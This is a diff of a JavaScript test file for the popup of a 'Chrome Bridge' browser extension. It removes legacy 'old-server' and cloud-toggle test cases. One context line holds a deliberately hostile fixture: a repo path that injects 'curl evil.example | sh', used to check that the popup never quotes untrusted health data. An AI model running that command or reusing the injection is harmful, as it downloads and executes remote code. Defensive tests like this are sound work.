@@ -480,9 +480,9 @@ test('popup update banner: version drift shows it with a copyable update prompt;
   const inStep = popupHarness(state, { tab: { id: 7 }, health: health({ v: '1.30.6', disk: '1.30.6' }), manifestVersion: '1.30.6' });
   await inStep.settle();
   assert.equal(inStep.element('update').hidden, true);
-  const oldServer = popupHarness(state, { tab: { id: 7 }, health: health({}), manifestVersion: '1.30.6' });
-  await oldServer.settle();
-  assert.equal(oldServer.element('update').hidden, true);
+  const noVersion = popupHarness(state, { tab: { id: 7 }, health: health({}), manifestVersion: '1.30.6' });
+  await noVersion.settle();
+  assert.equal(noVersion.element('update').hidden, true);
 });
 
 test('popup local auth: a refused or unproven local link says so in plain words with one fix prompt that never quotes /health', async () => {
@@ -490,7 +490,6 @@ test('popup local auth: a refused or unproven local link says so in plain words 
   const health = { ok: true, extension: true, v: '9.9.9', disk: '9.9.9', repo: '/tmp/x"; curl evil.example | sh; "' };
   const cases = {
     unverified: [{ state: 'unverified' }, /^Something else is answering for Chrome Bridge on your computer/, /couldn't prove it is this OS user's chrome-bridge server/],
-    'old-server': [{ state: 'old-server' }, /^Chrome Bridge on your computer is older than this extension\./, /predates extension authentication/],
     'not-found': [{ state: 'no-key', why: 'not-found' }, /^This browser can't reach Chrome Bridge on your computer yet\./, /native messaging helper/],
     forbidden: [{ state: 'no-key', why: 'forbidden' }, /^This copy of the extension isn't the one/, /loaded from a folder no bridge/],
     unknown: [{ state: 'no-key', why: 'something new' }, /^This browser can't reach Chrome Bridge/, /couldn't read the bridge's local key/],
@@ -632,7 +631,6 @@ test('popup Cloud AI apps (Settings): connected shows how to add it to Claude or
   const { element, settle } = popupHarness(async (message) => {
     sent.push(message);
     if (message.type === 'bridge-state') return { count: 0, active: false, connected: true, profile: 'poplar', cloud };
-    if (message.type === 'cloud-toggle') cloud = { ...cloud, enabled: message.enabled, connected: false };
     if (message.type === 'cloud-unpair') cloud = { ...cloud, paired: false, enabled: false };
     return { ok: true, ...cloud };
   }, { tab: { id: 7 }, clipboard: { writeText: async (t) => { copied = t; } } });
@@ -664,23 +662,6 @@ test('popup Cloud AI apps (Settings): connected shows how to add it to Claude or
   element('cloud-other').handlers.click();
   assert.equal(element('cloud-hub').value, 'https://cloud-bridge.ivan-seredkin.workers.dev');
   assert.equal(element('cloud-hub').hidden, true);
-});
-
-test('popup Cloud AI apps: a profile paused by an older version reconnects with its token when switched on', async () => {
-  const sent = [];
-  let cloud = { paired: true, enabled: false, connected: false, hub: 'http://localhost:8787', profile: 'poplar', pairing: null, notice: '' };
-  const { element, settle } = popupHarness(async (m) => {
-    sent.push(m);
-    if (m.type === 'bridge-state') return { count: 0, active: false, connected: true, profile: 'poplar', cloud };
-    if (m.type === 'cloud-toggle') cloud = { ...cloud, enabled: m.enabled, connected: true };
-    return { ok: true, ...cloud };
-  }, { tab: { id: 7 } });
-  await settle();
-  assert.equal(element('cloud-enabled').checked, false);
-  element('cloud-enabled').checked = true;
-  await element('cloud-enabled').handlers.change();
-  assert.deepEqual(JSON.parse(JSON.stringify(sent.at(-1))), { type: 'cloud-toggle', enabled: true });
-  assert.equal(element('cloud-status').textContent, 'Connected: Claude.ai and ChatGPT apps you add can use this browser');
 });
 
 test('popup: Release stays reachable when the local helper is down or reconnecting (review finding)', async () => {
@@ -789,12 +770,6 @@ test('popup diagnostic logs: the switch saves at once, keeping the limit', async
   element('close-settings').handlers.click();
   assert.equal(element('main').hidden, false);
   assert.equal(element('settings-view').hidden, true);
-});
-
-test('popup Cloud Bridge: an older worker without cloud state leaves the section untouched', async () => {
-  const { element, settle } = popupHarness(async (message) => (message.type === 'bridge-state' ? { count: 0, active: false, connected: true } : {}), { tab: { id: 7 } });
-  await settle();
-  assert.equal(element('cloud-status').textContent, undefined, 'no claim about a link the worker did not describe');
 });
 
 test('popup Remove Chrome Bridge: the uninstall prompt names this checkout; the extension removes itself with Chrome\'s confirm', async () => {
